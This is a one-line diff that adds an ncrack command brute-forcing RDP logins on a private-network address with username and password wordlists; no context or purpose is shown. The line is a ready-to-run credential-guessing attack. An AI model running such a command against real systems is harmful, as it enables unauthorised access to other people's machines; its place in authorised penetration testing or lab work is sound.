@@ -1,0 +1,1 @@
+ncrack -p rdp 192.168.1.105 -U users.txt -P pass.txt
